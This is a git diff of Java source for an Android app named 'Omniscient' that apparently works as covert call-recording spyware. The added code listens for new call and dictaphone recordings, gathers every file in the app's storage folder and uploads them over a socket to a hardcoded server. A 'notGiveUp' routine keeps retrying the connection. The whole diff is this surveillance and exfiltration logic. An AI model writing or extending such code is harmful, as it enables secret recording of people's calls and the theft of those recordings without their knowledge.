@@ -2,6 +2,7 @@ package com.postal.omniscient.postal.downloadFiles;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.app.usage.UsageEvents;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
@@ -31,13 +32,14 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.util.List;
 
 /**
  * Created by Alexandr on 01.07.2016.
  *
  * Загружаем файл на сервер
  */
-public class DownloadFileRun implements Runnable {
+public class DownloadFileRun extends Thread {
     private Socket socket;
     private OutputStream outputStream;
     private DataOutputStream dos;
@@ -48,6 +50,7 @@ public class DownloadFileRun implements Runnable {
     private final int SDK_INT = Build.VERSION.SDK_INT;
     private Intent intent;
     private BufferedReader reader;
+    private AdapterDownloadFlag is_downloadFlag;
 
 
     public DownloadFileRun(File[] allFoldersFiles, Context context, Intent intent) {
@@ -56,14 +59,15 @@ public class DownloadFileRun implements Runnable {
         this.intent = intent;
     }
 
-    private void start() {
+    public void start() {
 
-        AdapterDownloadFlag is_downloadFlag = new AdapterDownloadFlag();
-        String server = "192.168.1.109";
+        is_downloadFlag = new AdapterDownloadFlag();
+        String server = "192.168.168.101";
         int port = 2221;
 
         String isLoaded = "isLoaded ";
-        try { long fff = 13;                                  EventBus.getDefault().register(this);
+        try { long fff = 13;
+            EventBus.getDefault().register(this);
             socket = new Socket();//(server, port);
             socket.connect(new InetSocketAddress(server, port),2000);
             socket.setSoTimeout(50000);
@@ -128,15 +132,19 @@ public class DownloadFileRun implements Runnable {
                             dos.flush();
                         }
                     }
-                }Log.d(Msg, "       ВЫХОД ИЗ ЦЫКЛА ");
+                }Log.d(Msg, "       ВЫХОД ИЗ ЦЫКЛА ");notGiveUp();sockClose();//на эмуляторе вместо ошибки - выходит из цыкла
             } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
                 //EventBus.getDefault().unregister(this);
 //                if(!socket.isOutputShutdown()){Log.d(Msg, " isOutputShutdown !");}
 //                if(!socket.getKeepAlive()){Log.d(Msg, " getKeepAlive !");}
-                reader.close(); socket.close();dos.close();
-                notGiveUp();
+                sockClose();EventBus.getDefault().unregister(this);
             }
         } catch (IOException e) {
+            try{
+                socket.close();
+                EventBus.getDefault().unregister(this);
+            }catch (Exception ke){
+                Log.e(Msg, "Eror4  "+ke);}//reader и dos бют NullPointerException их не нужно закрывать - они пусты
             Log.e(Msg, "Eror2 "+e);
         }
         //outputStream = socket.getOutputStream();
@@ -144,15 +152,57 @@ public class DownloadFileRun implements Runnable {
 
     }
 
+    private void sockClose(){
+        try {
+            reader.close();socket.close();dos.close();
+
+        } catch (IOException e) {
+            Log.e(Msg, "Eror3 "+e);
+        }
+
+    }
     private void notGiveUp() {
 
         Log.i(Msg, "notGiveUp start ");
         String requiredPermission = "notGiveUpConnectCheckReceiver";
         context.sendBroadcast(new Intent(requiredPermission));
     }
-    @Subscribe(threadMode = ThreadMode.BACKGROUND)
-    public void onComand(EventBusData event){
-        Log.e(Msg, "           NOTES ME SEMPAI  ");
+    //слушаем когда диктофон или звонок запишется и отправляем запись на сервер
+    @Subscribe(threadMode = ThreadMode.ASYNC)
+    public void onEvent(EventBusData event){
+        Log.e(Msg, "!!!   NOTES ME SEMPAI  ");
+        if(!is_downloadFlag.getTreadIsWork()){
+            SendFilesOutOfTurn();
+        }
+    }
+    private void SendFilesOutOfTurn(){
+        try {
+            allFoldersFiles = getAllFoldersFiles(context);
+            if (allFoldersFiles != null) {
+                //отправка в новом потоке
+                SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
+                        socket, dos, is_downloadFlag);
+                Thread startDownlow = new Thread(dwnloadFile);
+                //поток для загрузки файлов на сервер
+                startDownlow.start();
+            }
+        }catch (Exception e){Log.e(Msg, "Exept 5 "+e.toString());}
+    }
+    /**  получаем пути к файлам для отправки на сервер     */
+    private  File[] getAllFoldersFiles (Context context){
+        //записать в массив и передать на отправку
+        String [] [] folders = new String[0][]; //массив папок и содержащихся в них файлов для отправки на сервер
+        File path; //путь к папке программы
+        File f; //путь к папке где сохраняются все файлы для отправки на сервер
+        File[] files_all; //массив папок в которых храняться файлы для отправки
+        File f2; //путь к файлу для отправки на сервер
+        File[] files; // массив файлов для отправки
+
+        path = context.getFilesDir();
+        f = new File(String.valueOf(path+"/Omniscient"));
+        files_all = f.listFiles();
+
+        return files_all;
     }
 
 //    @Subscribe(threadMode = ThreadMode.BACKGROUND)
